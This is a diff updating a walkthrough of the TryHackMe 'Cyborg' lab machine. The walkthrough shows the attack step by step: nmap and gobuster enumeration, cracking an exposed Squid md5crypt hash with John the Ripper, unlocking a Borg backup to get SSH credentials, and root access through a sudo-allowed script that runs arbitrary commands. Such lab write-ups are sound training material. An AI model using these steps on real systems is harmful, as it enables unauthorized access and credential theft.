@@ -1,12 +1,24 @@
 <div align="center">
   <h1>🤖 Cyborg Walkthrough 🤖</h1>
-  <p><b>Platform:</b> TryHackMe | <b>Target IP:</b> 10.49.182.220</p>
+  <p><b>Platform:</b> TryHackMe | <b>Difficulty:</b> Medium | <b>Target IP:</b> 10.49.182.220</p>
+  <p><i>Date Completed: 01 October 2026</i></p>
 </div>
 
 ---
 
 ## 🎯 Objective
-> Compromise the Cyborg machine by enumerating web services, cracking stored credentials, interacting with a Borg backup repository, and escalating privileges via a misconfigured backup script.
+> **Compromise the Cyborg machine by enumerating web services, cracking stored credentials, interacting with a Borg backup repository, and escalating privileges via a misconfigured backup script.**
+
+<br>
+
+## 🛠️ Tools Used
+| Tool | Purpose |
+| :--- | :--- |
+| **Nmap** | Port scanning and network service enumeration. |
+| **Gobuster** | Web directory and file brute-forcing. |
+| **John the Ripper** | Offline hash cracking (`md5crypt`) with the `rockyou.txt` wordlist. |
+| **Borg Backup** | Inspecting and extracting the encrypted repository archive. |
+| **SSH / Sudo** | Initial access and local privilege escalation. |
 
 <br>
 
@@ -20,7 +32,7 @@ nmap -sV -sC 10.49.182.220
 ```
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_02-45-11.png" alt="Nmap Scan" width="700px">
+  <img src="./images/Screenshot_2026-09-30_02-45-11.png" alt="Nmap Scan" width="700px">
   <br><i>Figure 1: Nmap reveals SSH (port 22) and an Apache web server (port 80).</i>
 </div>
 
@@ -32,7 +44,7 @@ gobuster dir -u http://10.49.182.220/ -w /usr/share/wordlists/dirb/common.txt -x
 ```
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_02-45-43.png" alt="Gobuster Output" width="700px">
+  <img src="./images/Screenshot_2026-09-30_02-45-43.png" alt="Gobuster Output" width="700px">
   <br><i>Figure 2: Gobuster discovers the /admin and /etc endpoints.</i>
 </div>
 
@@ -40,20 +52,20 @@ gobuster dir -u http://10.49.182.220/ -w /usr/share/wordlists/dirb/common.txt -x
 Navigating to the `/admin` panel, we find a shoutbox where the developers mention a Squid proxy and a backup named `music_archive`.
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_02-44-16.png" alt="Admin Panel Shoutbox" width="700px">
+  <img src="./images/Screenshot_2026-09-30_02-44-16.png" alt="Admin Panel Shoutbox" width="700px">
   <br><i>Figure 3: The admin shoutbox hinting at the music_archive backup.</i>
 </div>
 
-Exploring the `/etc` directory exposed by Apache directory listing, we find Squid configuration and password files. The `/etc/squid/passwd` file contains an MD5 crypt hash.
-
-<div align="center">
-  <img src="./Screenshot_2026-09-30_02-43-42.png" alt="Squid Passwd" width="700px">
-  <br><i>Figure 4: Exposed squid password hash.</i>
-</div>
+Exploring the `/etc` directory exposed by Apache directory listing, we find Squid configuration and password files. The `/etc/squid/passwd` file contains an MD5 crypt hash:
 
 ```text
 music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
 ```
+
+<div align="center">
+  <img src="./images/Screenshot_2026-09-30_02-43-42.png" alt="Squid Passwd" width="700px">
+  <br><i>Figure 4: Exposed squid password hash.</i>
+</div>
 
 <br>
 
@@ -64,11 +76,11 @@ We use John the Ripper and the `rockyou.txt` wordlist to crack the extracted has
 
 ```sh
 printf '%s\n' 'music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > /tmp/squid_hash
-john --format=md5crypt --wordlist=/tmp/rockyou.txt /tmp/squid_hash
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/squid_hash
 ```
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_03-26-51.png" alt="John the Ripper" width="700px">
+  <img src="./images/Screenshot_2026-09-30_03-26-51.png" alt="John the Ripper" width="700px">
   <br><i>Figure 5: Successfully cracking the hash to reveal the password "squidward".</i>
 </div>
 
@@ -76,11 +88,11 @@ john --format=md5crypt --wordlist=/tmp/rockyou.txt /tmp/squid_hash
 The admin panel linked to an `archive.tar` file. Downloading and extracting it reveals a Borg backup repository.
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_02-44-49.png" alt="Borg Backup Config" width="700px">
+  <img src="./images/Screenshot_2026-09-30_02-44-49.png" alt="Borg Backup Config" width="700px">
   <br><i>Figure 6: Inspecting the extracted Borg backup repository.</i>
 </div>
 
-Using the cracked password `squidward` as the Borg repository passphrase, we can extract the archive contents.
+Using the cracked password `squidward` as the Borg repository passphrase, we can extract the archive contents:
 
 ```sh
 BORG_PASSPHRASE=squidward borg extract /tmp/music_repo/home/field/dev/final_archive::music_archive
@@ -100,7 +112,7 @@ ssh alex@10.49.182.220
 ```
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_03-27-58.png" alt="SSH Access" width="700px">
+  <img src="./images/Screenshot_2026-09-30_03-27-58.png" alt="SSH Access" width="700px">
   <br><i>Figure 7: Successfully logging in via SSH and enumerating Alex's home directory.</i>
 </div>
 
@@ -108,11 +120,12 @@ ssh alex@10.49.182.220
 Checking our sudo privileges (`sudo -l`) reveals that `alex` can run `/etc/mp3backups/backup.sh` as root without a password. Reading this script shows it executes arbitrary commands passed to the `-c` flag.
 
 <div align="center">
-  <img src="./Screenshot_2026-09-30_03-28-41.png" alt="Sudo and backup.sh" width="700px">
+  <img src="./images/Screenshot_2026-09-30_03-28-41.png" alt="Sudo and backup.sh" width="700px">
   <br><i>Figure 8: Reading the user flag, checking sudo permissions, and inspecting the vulnerable backup script.</i>
 </div>
 
 We exploit this by passing a command to read the root flag directly (or spawning a root shell):
+
 ```sh
 sudo /etc/mp3backups/backup.sh -c '/bin/cat /root/root.txt'
 ```
@@ -147,5 +160,5 @@ sudo /etc/mp3backups/backup.sh -c '/bin/cat /root/root.txt'
 
 ---
 <div align="center">
-  <i>Walkthrough updated on 1 October 2026.</i>
+  <i>Walkthrough updated on 01 October 2026.</i>
 </div>
